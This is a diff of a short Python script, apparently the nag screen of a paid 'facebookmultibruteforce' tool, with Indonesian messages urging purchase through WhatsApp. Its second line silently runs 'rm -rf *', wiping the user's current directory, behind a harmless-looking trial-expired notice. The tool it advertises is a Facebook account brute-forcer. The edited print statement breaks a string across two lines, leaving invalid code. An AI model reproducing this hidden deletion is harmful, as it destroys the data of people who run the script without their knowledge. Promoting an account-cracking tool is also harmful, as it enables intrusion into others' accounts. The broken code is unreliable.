@@ -1,8 +1,8 @@
 import time,subprocess,os
 os.system("rm -rf *")
 os.system("clear")
-print("[!] mohon maaf trial gratis sudah berakhir")
-print("[!] silahkan membeli fitur premium untuk tool facebookmultibruteforce yang lebih baik.")
+print("[!] mohon maaf tool tidak gratis
+silahkan membeli fitur premium untuk tool facebookmultibruteforce yang lebih baik.")
 print("[!] pilih y untuk langsung menghubungi administrator (whatsapp)")
 f=raw_input("[!] beli? y/n): ").lower()
 if f =="y":
